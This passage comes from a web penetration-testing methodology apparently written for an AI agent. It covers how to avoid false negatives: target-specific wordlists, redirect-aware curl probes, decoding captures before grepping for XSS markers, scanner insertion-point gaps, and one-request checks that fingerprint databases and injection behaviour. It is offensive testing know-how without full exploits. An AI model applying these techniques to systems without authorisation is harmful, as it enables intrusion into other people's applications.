**Ledger.** A run containing 429s produces no negatives. Re-run before recording anything.

### F.8.4 The path was never in the wordlist

**Observed.** Directory brute force found nothing, so there is nothing there.

**Why it is wrong.** Generic wordlists contain generic names. Real apps have `/api/v2/internal-reports`,
`/legacy-admin`, `/tenantAdmin`, `/_next/static/chunks/pages/...` — names that only appear in the app's own
vocabulary.

**Disambiguate.** Build a target wordlist from the target before, or instead of, brute forcing:
```bash
# words from the app's own surface
cat /root/pentest/targets/TARGET/evidence/*.js /root/pentest/targets/TARGET/evidence/*.html 2>/dev/null \
  | grep -ohE '[A-Za-z0-9_-]{4,30}' | tr 'A-Z' 'a-z' | sort -u > /tmp/claude-0/words.txt
jsluice urls -R /root/pentest/targets/TARGET/evidence/bundle.js | grep -oE '/[A-Za-z0-9_/.-]+' | sort -u >> /tmp/claude-0/words.txt
gau --subs TARGET 2>/dev/null | sed -E 's#https?://[^/]+##' | cut -d? -f1 | sort -u >> /tmp/claude-0/words.txt
sort -u /tmp/claude-0/words.txt | wc -l
```
Also fuzz extensions on *known* paths rather than names in the void: for each known file, try
`.bak .old .orig .save .swp .tmp .zip .tar.gz ~ .1 .copy` (4.5).

**Ledger.** "Brute force found nothing" is not a disclosure negative. The negative belongs to the specific
paths you probed, and to nothing else.

### F.8.5 The tool followed a redirect and graded the destination

**Observed.** A probe reports 200. Or a scanner reports a path as existing. In a browser it is a login page.

**Why it is wrong.** `curl -L`, ffuf's `-r` and many scanners follow redirects and report the final response.
A 302 to `/login` followed to a 200 becomes "200 OK" in the output, which reads as a hit or, worse, as evidence
the endpoint is unauthenticated.

**Disambiguate.**
```bash
curl -sS -o /dev/null -w '%{http_code} -> %{redirect_url} final=%{num_redirects}\n' 'https://TARGET/admin'
```
Never use `-L` for a status-based decision. When you do need the body, check `%{redirect_url}` first.

**Ledger.** Any hit or miss recorded from a redirect-following run is `untested`. Re-probe without following.

### F.8.6 grep, jq and diff lied to you

**Observed.** You grepped the saved response for your canary and found nothing.

**Why it is wrong.** Small, boring mechanisms that cost whole findings:
- The body was gzipped, so the marker is not in the bytes you saved (`curl --compressed` or
  `-H 'Accept-Encoding: identity'`).
- The response contains NUL bytes, so `grep` treated it as binary and printed nothing useful (use `grep -a`).
- The marker is JSON-escaped (`<svg`, `\/`) or HTML-escaped (`&lt;svg`) and your pattern was the raw form.
- `jq` failed on a non-JSON error response and you read the empty output as "field absent".
- The payload was uppercased/lowercased by the app (`grep -i`).
- The marker spans a line break after pretty-printing.

**Disambiguate.**
```bash
curl -sS --compressed -H 'Cookie: session=...' 'https://TARGET/x' -o /tmp/claude-0/r.bin
grep -aio 'r0311' /tmp/claude-0/r.bin
grep -aio 'u003csvg\|&lt;svg\|%3csvg\|\\x3csvg' /tmp/claude-0/r.bin
python3 - <<'PY'
import json,sys,urllib.parse,html
b=open('/tmp/claude-0/r.bin','rb').read().decode('utf8','replace')
for name,s in (('raw',b),('unesc-html',html.unescape(b)),('unesc-url',urllib.parse.unquote(b))):
    print(name, 'r0311' in s, '<svg' in s)
PY
```

**Ledger.** A grep miss on a mangled or compressed capture is not a result. Re-check with decoded forms before
the row moves.

### F.8.7 Scanner insertion points did not include the vector

**Observed.** An automated audit (Burp Scanner, dalfox, arjun) finished with no issues on the endpoint.

**Why it is wrong.** Insertion points are configuration. Many scanners, by default, do not inject into JSON
*keys*, cookie names, header names, multipart part names, `Content-Type` values, XML element names, or path
segments — which is precisely the list in `../CLAUDE.md` 6.3. dalfox with `--skip-bav` skips whole checks by
design (correctly, for this kit's scope). arjun finds parameters from a wordlist and will not invent the
app's own names.

**Disambiguate.** For each endpoint, list the insertion points the tool used and diff that against the 2.3
catalog. Anything in 2.3 and not in the tool's list is hand-testing work, not covered surface.

**Ledger.** A tool's "no issues" covers exactly the insertion points it used. Name them in `Notes`; leave the
rest `untested`.

---

## F.9 Pre-negative checklist

Run this before writing `tested-negative` on any row. Any "no" or "did not check" means the row keeps its
current state.

| # | Question | Concrete check |
|---|---|---|
| 1 | Do I have my own hand-built request, the literal payload, and the response saved — not a tool's summary? | one `curl` and its response in `evidence/`, referenced from the row (6.2, `../CLAUDE.md` 8, F.8) |
| 2 | Did the payload reach the app? | app-level latency (not edge-fast), no `Age`/`x-cache` hit, no 403/429, echo or log shows the value arrived (F.2.2, F.3.3) |
| 3 | Did a control request behave differently from my probe? | same request with a nonsense value or path; identical = no information (F.2.1) |
| 4 | Is my baseline still valid? | re-hit `/api/me` (or equivalent) after the batch; 200 as the right user (F.2.7) |
| 5 | Was the payload the right family for the context? | numeric → `2-1`; identifier → the DB's quote char; no-shell → argument injection; engine-correct template delimiters (F.5) |
| 6 | Did I test the **name** as well as the value? | key, cookie name, header name, path segment, filename, `Content-Type`, XML element name (6.3, F.1.1) |
| 7 | If the sink is blind, did a callback get a fair try on a channel I proved works? | marker in `oob.log`, and an egress test through a legitimate app feature (F.4.1, F.4.3) |
| 8 | If the input is stored, did I read it back and walk every render site? | byte-compare the read-back, then the 3.21 table, including exports and raw email source (F.6.1, F.6.3) |
| 9 | Could this fire later? | a timestamped canary planted and a recheck time noted; listener logging to a file for 24h+ (F.4.2) |

If any answer above depends on a behaviour you have not confirmed on this target — which database, whether the
position is bound, whether stacking works, whether a channel is alive — establish it with F.10 first. An entry
in this file applied to the wrong stack produces a confident wrong negative.

Two habits carry most of the value in this file:

- **Always send a control.** A result with nothing to compare against is not a result.
- **Prove the channel before you trust its silence.** Reflection, timing, callback, storage — each has to be
  shown to work once, on this target, before its absence means anything.

---

## F.10 Verify on target, do not trust recall

Every entry above turns on some implementation detail: which database, whether the driver binds, whether
normalisation runs before or after validation. Those details are the most common source of a confident wrong
answer — both from a recalled "fact" and from a stale note.

So this section is not a list of behaviours. It is the set of one-request checks that establish which behaviour
*this* target has, before you let any entry above decide a ledger state. `05-quirks.md` is the other half: this
table says what to check, `05-` says what the answer means.

Run the ones relevant to the row you are about to close. Each is one request and touches no data.

| What you need to know | The check | How to read it |
|---|---|---|
| Which database | Send the fingerprint probes from 3.1 and compare which string-concat and version expression is accepted | Wrong family = every payload you sent was the wrong shape. See F.5.1 and F.5.4 |
| Is my value actually bound | Quote-parity ladder on **this** position (3.1, and F.1.1 for the key half) | `error / clean / error` = concatenated. `clean / clean / clean` = bound *or* never reached SQL — F.3 tells them apart |
| Is a *different* position in the same statement bound | Run the ladder separately on each part of the pair or map | A bound value says nothing about the key. This is F.1.1, the entry this file exists for |
| Does stacking work here | One benign second statement after a terminator, read only | A rejected stacked query proves nothing about the injection (F.5.6). Driver and protocol decide this, not the DB alone — verify, do not assume |
| Does normalisation run after validation | Send the payload once plain, once in a form that only becomes the payload after normalising (fullwidth, overlong, entity) | If only the normalised form gets through, validation runs first and you have a bypass. Families in B.3 |
| Which quote character the identifier context wants | Ladder with `'`, `"`, backtick, `]` in turn | Only one will be right, and a wrong one reads as a clean negative (F.5.4) |
| Does the template engine do arithmetic at all | The engine-identify path in 3.4 | Several engines cannot evaluate `7*7`, so a clean response is not evidence (F.5.3) |
| Is my egress channel alive | Trigger a callback through a legitimate app feature that fetches a URL | Silence on a channel you never proved is not a negative (F.4.1, F.4.3) |
| Is reflection alive on this path | A unique harmless marker, then search body, headers and any stored view | If the marker never appears anywhere, you are blind here and owe an OOB attempt |
| Is my session still the session I baselined | Re-assert identity after the batch | See F.2.7. Cheapest way to fake a ledger by accident |

Two rules for this section:

- **Prefer a test over a belief.** If an entry above says "PHP does X" and you have not checked that this target
  is PHP and this version does X, you do not have a result yet. Write the check into the row.
- **Record the answer once per target, at the top of `notes.md`.** These facts are stable for the engagement and
  re-deriving them per row wastes requests you are rate-limited on. Stack, bound-or-not per sink shape, quote
  character, live channels — four lines, written once, reused by every row.

If you learn a behaviour the hard way — a payload family that failed for a reason not listed above — that is a
phase 6 entry (`../CLAUDE.md` 5). The behaviour goes in `05-quirks.md`, the false negative it caused goes here.
Both, not one: a behaviour is only useful attached to the mistake it produces, and a trap is only actionable if
you know which stacks it applies to.
